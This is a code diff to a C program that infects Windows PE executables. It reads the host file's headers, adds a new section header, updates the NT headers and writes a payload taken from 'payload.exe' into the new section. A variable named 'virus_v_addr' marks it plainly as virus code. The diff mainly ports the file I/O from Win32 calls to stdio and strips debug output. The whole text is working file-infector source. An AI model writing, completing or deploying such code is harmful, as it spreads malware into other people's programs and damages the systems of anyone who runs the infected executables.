@@ -16,11 +16,8 @@ typedef struct _payload_info_t
 #define BUFFER_SIZE 1024
 
 typedef WINBOOL (*io_func)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
-void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset);
 
 payload_info_t get_payload();
-
-
 
 int main(int argc, char* argv[]) 
 {   
@@ -28,35 +25,23 @@ int main(int argc, char* argv[])
     freopen("output.txt", "w", stdout);
 
     payload_info_t payload_info = get_payload();
-    // payload_info_t payload_info = {payload, 1024};
-    // exit(0);
 
-    HANDLE file = CreateFile(EXE_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (file == INVALID_HANDLE_VALUE) 
-    {
-        puts("Failed to open.");
-        exit(1);
-    }
+    FILE *host = fopen(EXE_FILE_NAME, "rb+");
 
 // get nt_header to write back
     IMAGE_DOS_HEADER i_dos_header = {0};
-    io(ReadFile, (BYTE*)&i_dos_header, sizeof(i_dos_header), file, FILE_BEGIN, 0);
+    fread(&i_dos_header, 1, sizeof(i_dos_header), host);
     IMAGE_NT_HEADERS i_nt_headers = {0};
-    io(ReadFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);
-
-    // printf("NumberOfSections: %d\n", i_nt_headers.FileHeader.NumberOfSections);
-    // puts("Iterating through section headers...");
+    fseek(host, i_dos_header.e_lfanew, SEEK_SET);
+    fread(&i_nt_headers, 1, sizeof(i_nt_headers), host);
 
 // get raw data size, NumberOfSections and the last header
     IMAGE_SECTION_HEADER i_sect_header = {0};
     int raw_data_size = 0;
     for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
     {
-        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
-        // puts(i_sect_header.Name);
-        // printf("VirtualAddress: %X\n", i_sect_header.VirtualAddress);
+        fread(&i_sect_header, 1, sizeof(i_sect_header), host);
         raw_data_size += i_sect_header.SizeOfRawData;
-        // puts("");
     }
     puts("");
     
@@ -82,12 +67,6 @@ int main(int argc, char* argv[])
         *i_nt_headers.OptionalHeader.FileAlignment;
     DWORD PointerToRawData = sect_end;
 
-// test
-    // printf("sizeof(payload): %X\n",  sizeof(payload));
-    // printf("payload_raw_size: %X\n", payload_raw_size);
-    printf("FileAlignment: %X\n", i_nt_headers.OptionalHeader.FileAlignment);
-
-
     // i_sect_header is now the header of last section
     DWORD virus_v_addr = i_sect_header.VirtualAddress
         + i_sect_header.Misc.VirtualSize 
@@ -106,7 +85,8 @@ int main(int argc, char* argv[])
         Characteristics // t
     };
 
-    io(WriteFile, (BYTE*)&new_sect_header, sizeof(new_sect_header), file, FILE_CURRENT, 0);
+    fseek(host, 0, SEEK_CUR);
+    fwrite(&new_sect_header, 1, sizeof(new_sect_header), host);
 // END adding new section header()
 
 
@@ -124,38 +104,24 @@ int main(int argc, char* argv[])
         + i_nt_headers.OptionalHeader.SectionAlignment 
         - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;
 
-    io(WriteFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);
+    fseek(host, i_dos_header.e_lfanew, SEEK_SET);
+    fwrite(&i_nt_headers, 1, sizeof(i_nt_headers), host);
 // END updating 
 
 
 
 // print test for add new sect header 
     puts("After adding new sect header: ");
-    SetFilePointer(file, i_dos_header.e_lfanew + sizeof(i_nt_headers), NULL, FILE_BEGIN);
+    // SetFilePointer(host, i_dos_header.e_lfanew + sizeof(i_nt_headers), NULL, FILE_BEGIN);
     for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
     {
-        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
         puts(i_sect_header.Name);
     }
 
-    io(WriteFile, payload_info.payload, payload_info.size, file, FILE_BEGIN, sect_end);
-}
-
-void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset)
-{
-    DWORD bytesRead = 0;
-
-    if (SetFilePointer(file, offset, NULL, offset_start) == INVALID_SET_FILE_POINTER)
-    {
-        puts("Err when set pointer");
-        exit(1);
-    }
-    if (!operation(file, buffer, size, &bytesRead, NULL)) 
-    {
-        puts("Failed to read.");
-        CloseHandle(file);
-        exit(1);
-    }
+// write payload
+    fseek(host, sect_end, SEEK_SET);
+    fwrite(payload_info.payload, 1, payload_info.size, host);
+    fclose(host);
 }
 
 #define PAYLOAD_FILE_NAME "payload.exe"
